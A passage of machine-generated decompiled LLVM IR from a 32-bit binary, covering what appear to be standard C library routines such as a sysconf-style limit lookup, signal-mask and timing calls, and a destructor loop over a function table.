  store i32 %v5_804f0ab, i32* %eax.global-to-local, align 4
  store i32 %v5_804f0ab, i32* @edi, align 4
  %v1_804f0b2 = call i32 @function_804b774(i32 %v2_804f09e)
  store i32 %v1_804f0b2, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0b2, i32* @ebx, align 4
  %v1_804f0bc = inttoptr i32 %v1_804f0b2 to i32*
  %v2_804f0bc = load i32, i32* %v1_804f0bc, align 4
  store i32 %v2_804f0bc, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f0c3 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f0c3 = call i32 @function_804fa50(i32 2, %_TYPEDEF_sigset_t* %v3_804f0c3, i32 0)
  store i32 %v4_804f0c3, i32* %eax.global-to-local, align 4
  %v0_804f0c8 = load i32, i32* @esi, align 4
  %v1_804f0c8 = load i32, i32* @ebx, align 4
  %v2_804f0c8 = inttoptr i32 %v1_804f0c8 to i32*
  store i32 %v0_804f0c8, i32* %v2_804f0c8, align 4
  %v0_804f0f2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f0ef

dec_label_pc_804f0cc:                             ; preds = %dec_label_pc_804f092
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804f0d2 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804f0d2 = call i32 @function_804fa50(i32 2, %_TYPEDEF_sigset_t* %v3_804f0d2, i32 0)
  store i32 %v4_804f0d2, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f0e8

dec_label_pc_804f0dd:                             ; preds = %dec_label_pc_804f00f
  %v2_804f0df = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f0df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0e8

dec_label_pc_804f0e8:                             ; preds = %dec_label_pc_804f0cc, %dec_label_pc_804f0dd
  %storemerge3.pre-phi = phi i32 [ %v2_804f09e, %dec_label_pc_804f0cc ], [ %v2_804f0df, %dec_label_pc_804f0dd ]
  %v3_804f0e8 = phi i32 [ %v2_804eff4, %dec_label_pc_804f0cc ], [ %v4_804f014, %dec_label_pc_804f0dd ]
  %v2_804f0e8 = phi i32 [ 0, %dec_label_pc_804f0cc ], [ %v4_804f014, %dec_label_pc_804f0dd ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804f0e8 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804f0e8 = call i32 @function_804f938(%timespec* %v4_804f0e8, i32 %storemerge3.pre-phi, i32 %v2_804f0e8, i32 %v3_804f0e8)
  store i32 %v5_804f0e8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ef

dec_label_pc_804f0ef:                             ; preds = %dec_label_pc_804f0a7, %dec_label_pc_804f0e8
  %v0_804f0f2 = phi i32 [ %v0_804f0f2.pre, %dec_label_pc_804f0a7 ], [ %v5_804f0e8, %dec_label_pc_804f0e8 ]
  %v1_804f0f2 = icmp eq i32 %v0_804f0f2, 0
  br i1 %v1_804f0f2, label %dec_label_pc_804f10f, label %dec_label_pc_804f0f6

dec_label_pc_804f0f6:                             ; preds = %dec_label_pc_804f0ef
  %v4_804f106 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804f106, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f116

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804ef98, %dec_label_pc_804f0ef
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f116

dec_label_pc_804f113:                             ; preds = %dec_label_pc_804f038, %dec_label_pc_804eff3, %dec_label_pc_804efc5
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f116

dec_label_pc_804f116:                             ; preds = %dec_label_pc_804f10f, %dec_label_pc_804f0f6, %dec_label_pc_804f06a, %dec_label_pc_804f113
  %v0_804f120 = phi i32 [ 0, %dec_label_pc_804f10f ], [ %v4_804f106, %dec_label_pc_804f0f6 ], [ %v0_804f120.pre, %dec_label_pc_804f06a ], [ -1, %dec_label_pc_804f113 ]
  store i32 %v0_804ef9b, i32* @ebx, align 4
  store i32 %v0_804ef9a, i32* @esi, align 4
  store i32 %v0_804ef99, i32* @edi, align 4
  store i32 %v0_804ef98, i32* @ebp, align 4
  ret i32 %v0_804f120

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804f0b2, { 1, 0, 2 }
  uselistorder i32 %v2_804f09e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804f035, { 2, 1, 0 }
  uselistorder i32 %v4_804f014, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804eff4, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804efdb, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804efc2, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051294, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f116, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f10f, { 1, 0 }
  uselistorder label %dec_label_pc_804f0ef, { 1, 0 }
  uselistorder label %dec_label_pc_804f0e8, { 1, 0 }
}

define i32 @function_804f124(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f124:
  switch i32 %arg1, label %dec_label_pc_804f143 [
    i32 0, label %dec_label_pc_804f153
    i32 1, label %dec_label_pc_804f238
    i32 2, label %dec_label_pc_804f15d
    i32 3, label %dec_label_pc_804f167
    i32 4, label %dec_label_pc_804f171
    i32 5, label %dec_label_pc_804f207
    i32 6, label %dec_label_pc_804f179
    i32 7, label %dec_label_pc_804f139
    i32 8, label %dec_label_pc_804f139
    i32 9, label %dec_label_pc_804f139
    i32 10, label %dec_label_pc_804f139
    i32 11, label %dec_label_pc_804f139
    i32 12, label %dec_label_pc_804f139
    i32 13, label %dec_label_pc_804f139
    i32 14, label %dec_label_pc_804f139
    i32 15, label %dec_label_pc_804f139
    i32 16, label %dec_label_pc_804f139
    i32 17, label %dec_label_pc_804f139
    i32 18, label %dec_label_pc_804f139
    i32 19, label %dec_label_pc_804f139
    i32 20, label %dec_label_pc_804f139
    i32 21, label %dec_label_pc_804f139
    i32 22, label %dec_label_pc_804f139
    i32 23, label %dec_label_pc_804f238
    i32 24, label %dec_label_pc_804f238
    i32 25, label %dec_label_pc_804f244
    i32 26, label %dec_label_pc_804f215
    i32 27, label %dec_label_pc_804f238
    i32 28, label %dec_label_pc_804f18b
    i32 29, label %dec_label_pc_804f20e
    i32 30, label %dec_label_pc_804f183
    i32 31, label %dec_label_pc_804f223
    i32 32, label %dec_label_pc_804f238
    i32 33, label %dec_label_pc_804f238
    i32 34, label %dec_label_pc_804f238
    i32 35, label %dec_label_pc_804f21c
    i32 36, label %dec_label_pc_804f24b
    i32 37, label %dec_label_pc_804f252
    i32 38, label %dec_label_pc_804f24b
    i32 39, label %dec_label_pc_804f195
    i32 40, label %dec_label_pc_804f259
    i32 41, label %dec_label_pc_804f238
    i32 42, label %dec_label_pc_804f223
    i32 43, label %dec_label_pc_804f252
    i32 44, label %dec_label_pc_804f260
    i32 45, label %dec_label_pc_804f252
    i32 46, label %dec_label_pc_804f20e
    i32 47, label %dec_label_pc_804f20e
    i32 48, label %dec_label_pc_804f20e
    i32 49, label %dec_label_pc_804f238
    i32 50, label %dec_label_pc_804f238
    i32 51, label %dec_label_pc_804f20e
    i32 52, label %dec_label_pc_804f20e
    i32 53, label %dec_label_pc_804f238
    i32 54, label %dec_label_pc_804f238
    i32 55, label %dec_label_pc_804f238
    i32 56, label %dec_label_pc_804f238
    i32 57, label %dec_label_pc_804f238
    i32 58, label %dec_label_pc_804f238
    i32 59, label %dec_label_pc_804f238
    i32 60, label %dec_label_pc_804f238
    i32 61, label %dec_label_pc_804f238
    i32 62, label %dec_label_pc_804f238
    i32 63, label %dec_label_pc_804f238
    i32 64, label %dec_label_pc_804f238
    i32 65, label %dec_label_pc_804f238
    i32 66, label %dec_label_pc_804f238
    i32 67, label %dec_label_pc_804f139
    i32 68, label %dec_label_pc_804f139
    i32 69, label %dec_label_pc_804f21c
    i32 70, label %dec_label_pc_804f21c
    i32 71, label %dec_label_pc_804f21c
    i32 72, label %dec_label_pc_804f223
    i32 73, label %dec_label_pc_804f22a
    i32 74, label %dec_label_pc_804f231
    i32 75, label %dec_label_pc_804f19f
    i32 76, label %dec_label_pc_804f231
    i32 77, label %dec_label_pc_804f139
    i32 78, label %dec_label_pc_804f139
    i32 79, label %dec_label_pc_804f139
    i32 80, label %dec_label_pc_804f139
    i32 81, label %dec_label_pc_804f139
    i32 82, label %dec_label_pc_804f139
    i32 83, label %dec_label_pc_804f139
    i32 84, label %dec_label_pc_804f139
    i32 85, label %dec_label_pc_804f238
    i32 86, label %dec_label_pc_804f238
    i32 87, label %dec_label_pc_804f215
    i32 88, label %dec_label_pc_804f1a9
    i32 89, label %dec_label_pc_804f1b3
    i32 90, label %dec_label_pc_804f22a
    i32 91, label %dec_label_pc_804f139
    i32 92, label %dec_label_pc_804f139
    i32 93, label %dec_label_pc_804f139
    i32 94, label %dec_label_pc_804f139
    i32 95, label %dec_label_pc_804f20e
    i32 96, label %dec_label_pc_804f238
    i32 97, label %dec_label_pc_804f238
    i32 98, label %dec_label_pc_804f139
    i32 99, label %dec_label_pc_804f139
    i32 100, label %dec_label_pc_804f139
    i32 101, label %dec_label_pc_804f1bd
    i32 102, label %dec_label_pc_804f200
    i32 103, label %dec_label_pc_804f23d
    i32 104, label %dec_label_pc_804f215
    i32 105, label %dec_label_pc_804f1c7
    i32 106, label %dec_label_pc_804f223
    i32 107, label %dec_label_pc_804f223
    i32 108, label %dec_label_pc_804f207
    i32 109, label %dec_label_pc_804f244
    i32 110, label %dec_label_pc_804f260
    i32 111, label %dec_label_pc_804f200
    i32 112, label %dec_label_pc_804f23d
    i32 113, label %dec_label_pc_804f260
    i32 114, label %dec_label_pc_804f1d1
    i32 115, label %dec_label_pc_804f259
    i32 116, label %dec_label_pc_804f238
    i32 117, label %dec_label_pc_804f238
    i32 118, label %dec_label_pc_804f1db
    i32 119, label %dec_label_pc_804f1e5
    i32 120, label %dec_label_pc_804f252
    i32 121, label %dec_label_pc_804f215
    i32 122, label %dec_label_pc_804f215
    i32 123, label %dec_label_pc_804f215
    i32 124, label %dec_label_pc_804f215
    i32 125, label %dec_label_pc_804f139
    i32 126, label %dec_label_pc_804f139
    i32 127, label %dec_label_pc_804f238
    i32 128, label %dec_label_pc_804f238
    i32 129, label %dec_label_pc_804f139
    i32 130, label %dec_label_pc_804f139
    i32 131, label %dec_label_pc_804f238
    i32 149, label %dec_label_pc_804f1ec
  ]

dec_label_pc_804f139:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f143:                             ; preds = %dec_label_pc_804f124
  %v1_804f143 = call i32 @function_804b774(i32 ptrtoint (i32* @0 to i32))
  %v1_804f148 = inttoptr i32 %v1_804f143 to i32*
  store i32 22, i32* %v1_804f148, align 4
  br label %dec_label_pc_804f238

dec_label_pc_804f153:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f15d:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f167:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f171:                             ; preds = %dec_label_pc_804f124
  %v0_804f174 = call i32 @function_804f7c8()
  br label %dec_label_pc_804f179

dec_label_pc_804f179:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f171
  br label %dec_label_pc_804f265

dec_label_pc_804f183:                             ; preds = %dec_label_pc_804f124
  %v0_804f186 = call i32 @function_804b5b8()
  br label %dec_label_pc_804f18b

dec_label_pc_804f18b:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f183
  br label %dec_label_pc_804f265

dec_label_pc_804f195:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f19f:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1a9:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1b3:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1bd:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1d1:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1db:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1e5:                             ; preds = %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f1ec:                             ; preds = %dec_label_pc_804f124
  %v5_804f1f2 = call i32 @function_804f728(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804f1fa = icmp slt i32 %v5_804f1f2, 0
  %v1_804f1fc = icmp eq i1 %v2_804f1fa, false
  br i1 %v1_804f1fc, label %dec_label_pc_804f20e, label %dec_label_pc_804f238

dec_label_pc_804f200:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f207:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f20e:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f1ec
  br label %dec_label_pc_804f265

dec_label_pc_804f215:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f21c:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f22a:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f231:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f238:                             ; preds = %dec_label_pc_804f1ec, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f143
  br label %dec_label_pc_804f265

dec_label_pc_804f23d:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f244:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f24b:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f252:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f259:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f260:                             ; preds = %dec_label_pc_804f124, %dec_label_pc_804f124, %dec_label_pc_804f124
  br label %dec_label_pc_804f265

dec_label_pc_804f265:                             ; preds = %dec_label_pc_804f259, %dec_label_pc_804f252, %dec_label_pc_804f24b, %dec_label_pc_804f244, %dec_label_pc_804f23d, %dec_label_pc_804f231, %dec_label_pc_804f22a, %dec_label_pc_804f223, %dec_label_pc_804f21c, %dec_label_pc_804f215, %dec_label_pc_804f207, %dec_label_pc_804f200, %dec_label_pc_804f20e, %dec_label_pc_804f1e5, %dec_label_pc_804f1db, %dec_label_pc_804f1d1, %dec_label_pc_804f1c7, %dec_label_pc_804f1bd, %dec_label_pc_804f1b3, %dec_label_pc_804f1a9, %dec_label_pc_804f19f, %dec_label_pc_804f195, %dec_label_pc_804f18b, %dec_label_pc_804f179, %dec_label_pc_804f167, %dec_label_pc_804f15d, %dec_label_pc_804f153, %dec_label_pc_804f139, %dec_label_pc_804f238, %dec_label_pc_804f260
  %v0_804f268 = phi i32 [ 255, %dec_label_pc_804f259 ], [ 2048, %dec_label_pc_804f252 ], [ 99, %dec_label_pc_804f24b ], [ 20, %dec_label_pc_804f244 ], [ -128, %dec_label_pc_804f23d ], [ 1024, %dec_label_pc_804f231 ], [ 4, %dec_label_pc_804f22a ], [ 32, %dec_label_pc_804f223 ], [ 256, %dec_label_pc_804f21c ], [ 2147483647, %dec_label_pc_804f215 ], [ 16, %dec_label_pc_804f207 ], [ 127, %dec_label_pc_804f200 ], [ 200112, %dec_label_pc_804f20e ], [ 9, %dec_label_pc_804f1e5 ], [ 65535, %dec_label_pc_804f1db ], [ -32768, %dec_label_pc_804f1d1 ], [ -2147483648, %dec_label_pc_804f1c7 ], [ 8, %dec_label_pc_804f1bd ], [ 500, %dec_label_pc_804f1b3 ], [ 4096, %dec_label_pc_804f1a9 ], [ 16384, %dec_label_pc_804f19f ], [ 1000, %dec_label_pc_804f195 ], [ 32768, %dec_label_pc_804f18b ], [ 6, %dec_label_pc_804f179 ], [ 65536, %dec_label_pc_804f167 ], [ 100, %dec_label_pc_804f15d ], [ 131072, %dec_label_pc_804f153 ], [ 1, %dec_label_pc_804f139 ], [ -1, %dec_label_pc_804f238 ], [ 32767, %dec_label_pc_804f260 ]
  ret i32 %v0_804f268

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 19, { 3, 1, 0, 2 }
  uselistorder i32 13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f265, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804f238, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804f20e, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f18b, { 1, 0 }
  uselistorder label %dec_label_pc_804f179, { 1, 0 }
}

define i32 @function_804f26c() local_unnamed_addr {
dec_label_pc_804f26c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f26c = load i32, i32* @ebx, align 4
  store i32 %v0_804f26c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), i32 0), label %dec_label_pc_804f280, label %dec_label_pc_804f28d

dec_label_pc_804f280:                             ; preds = %dec_label_pc_804f26c, %dec_label_pc_804f280
  %v1_804f2878 = phi i32 [ %v1_804f287, %dec_label_pc_804f280 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), i32 -1), %dec_label_pc_804f26c ]
  store i32 ptrtoint (i32* @global_var_804f287.175 to i32), i32* %stack_var_-16, align 4
  %v5_804f280 = mul i32 %v1_804f2878, 4
  %v6_804f280 = add i32 %v5_804f280, ptrtoint (i32* @global_var_8055ce8.174 to i32)
  %v7_804f280 = inttoptr i32 %v6_804f280 to i32*
  %v8_804f280 = load i32, i32* %v7_804f280, align 4
  call void @__pseudo_call(i32 %v8_804f280)
  %v0_804f287.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f287 = add i32 %v0_804f287.pre, -1
  store i32 %v1_804f287, i32* %ebx.global-to-local, align 4
  %v10_804f288 = icmp eq i32 %v0_804f287.pre, 0
  %v1_804f28b = icmp eq i1 %v10_804f288, false
  br i1 %v1_804f28b, label %dec_label_pc_804f280, label %dec_label_pc_804f28d

dec_label_pc_804f28d:                             ; preds = %dec_label_pc_804f280, %dec_label_pc_804f26c
  %v0_804f28d = load i32, i32* @global_var_8058754.176, align 4
  %v1_804f292 = icmp eq i32 %v0_804f28d, 0
  br i1 %v1_804f292, label %dec_label_pc_804f298, label %dec_label_pc_804f296

dec_label_pc_804f296:                             ; preds = %dec_label_pc_804f28d
  %v0_804f296 = load i32, i32* %stack_var_-16, align 4
  %v1_804f296 = call i32 @unknown_0(i32 %v0_804f296)
  br label %dec_label_pc_804f298

dec_label_pc_804f298:                             ; preds = %dec_label_pc_804f296, %dec_label_pc_804f28d
  %v0_804f298 = load i32, i32* @global_var_8058758.177, align 8
  %v1_804f29e = icmp eq i32 %v0_804f298, 0
  br i1 %v1_804f29e, label %dec_label_pc_804f2a7, label %dec_label_pc_804f2a2

dec_label_pc_804f2a2:                             ; preds = %dec_label_pc_804f298
  %v2_804f2a2 = load i32, i32* %stack_var_-16, align 4
  %v1_804f2a5 = call i32 @unknown_0(i32 %v2_804f2a2)
  br label %dec_label_pc_804f2a7

dec_label_pc_804f2a7:                             ; preds = %dec_label_pc_804f2a2, %dec_label_pc_804f298
  %v2_804f2a7 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804f2a7

; uselistorder directives
  uselistorder i32 %v1_804f287, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f280, { 1, 0 }
}

define i32 @function_804f2ab(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f2ab:
  ret i32 0
}

define i32 @function_804f2ae(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f2ae:
  %v0_804f2ae = load i32, i32* @eax, align 4
  ret i32 %v0_804f2ae
}

define i32 @function_804f2af() local_unnamed_addr {
dec_label_pc_804f2af:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804f2af = load i32, i32* @esi, align 4
  %v0_804f2b0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f2b0, i32* %stack_var_-8, align 4
  %v0_804f2b4 = load i32, i32* @eax, align 4
  store i32 %v0_804f2b4, i32* @esi, align 4
  %v0_804f2b6 = load i32, i32* @edx, align 4
  store i32 %v0_804f2b6, i32* @ebx, align 4
  %v5_804f2bb = call i32 @function_804f62c(i32 %v0_804f2b4, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804f2c3 = add i32 %v5_804f2bb, 1
  %v8_804f2c3 = icmp eq i32 %v1_804f2c3, 0
  %v1_804f2c4 = icmp eq i1 %v8_804f2c3, false
  br i1 %v1_804f2c4, label %dec_label_pc_804f2df, label %dec_label_pc_804f2c6

dec_label_pc_804f2c6:                             ; preds = %dec_label_pc_804f2af
  %v0_804f2c8 = load i32, i32* @ebx, align 4
  %v5_804f2ce = call i32 @function_804f96c(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054560.178, i32 0, i32 0), i32 %v0_804f2c8, i32 %v1_804f2c3)
  %v1_804f2d6 = load i32, i32* @esi, align 4
  %v12_804f2d6 = icmp eq i32 %v5_804f2ce, %v1_804f2d6
  br i1 %v12_804f2d6, label %dec_label_pc_804f2df, label %dec_label_pc_804f2da

dec_label_pc_804f2da:                             ; preds = %dec_label_pc_804f2c6
  %v0_804f2da = call i32 @function_804e8e4()
  br label %dec_label_pc_804f2df

dec_label_pc_804f2df:                             ; preds = %dec_label_pc_804f2c6, %dec_label_pc_804f2af, %dec_label_pc_804f2da
  %v2_804f2df = load i32, i32* %stack_var_-12, align 4
  %v2_804f2e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f2e0, i32* @ebx, align 4
  store i32 %v0_804f2af, i32* @esi, align 4
  ret i32 %v2_804f2df

; uselistorder directives
  uselistorder i32 ()* @function_804e8e4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f2df, { 2, 0, 1 }
}

define i32 @function_804f2e3() local_unnamed_addr {
dec_label_pc_804f2e3:
  %v0_804f2e6 = load i8, i8* @global_var_805875c.179, align 4
  %v1_804f2e6 = icmp eq i8 %v0_804f2e6, 0
  %v1_804f2ed = icmp eq i1 %v1_804f2e6, false
  br i1 %v1_804f2ed, label %dec_label_pc_804f2e3.dec_label_pc_804f31f_crit_edge, label %dec_label_pc_804f2ef

dec_label_pc_804f2e3.dec_label_pc_804f31f_crit_edge: ; preds = %dec_label_pc_804f2e3
  %v0_804f322.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f31f

dec_label_pc_804f2ef:                             ; preds = %dec_label_pc_804f2e3
  store i8 1, i8* @global_var_805875c.179, align 4
  store i32 4096, i32* @global_var_8058750.102, align 16
  %v0_804f31a = call i32 @function_804be78()
  br label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f2e3.dec_label_pc_804f31f_crit_edge, %dec_label_pc_804f2ef
  %v0_804f322 = phi i32 [ %v0_804f322.pre, %dec_label_pc_804f2e3.dec_label_pc_804f31f_crit_edge ], [ %v0_804f31a, %dec_label_pc_804f2ef ]
  ret i32 %v0_804f322

; uselistorder directives
  uselistorder i8* @global_var_805875c.179, { 1, 0 }
  uselistorder label %dec_label_pc_804f31f, { 1, 0 }
}

define i32 @function_804f323(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f323:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_804f324 = load i32, i32* @edi, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8058748.180, align 8
  store i32 %arg6, i32* @global_var_8058758.177, align 8
  %v2_804f35a = mul i32 %arg2, 4
  %v3_804f35a = add i32 %tmp31, %v2_804f35a
  %v1_804f35d = add i32 %v3_804f35a, 4
  store i32 %v1_804f35d, i32* @global_var_805874c.172, align 4
  %v3_804f365 = load i32, i32* %arg3, align 4
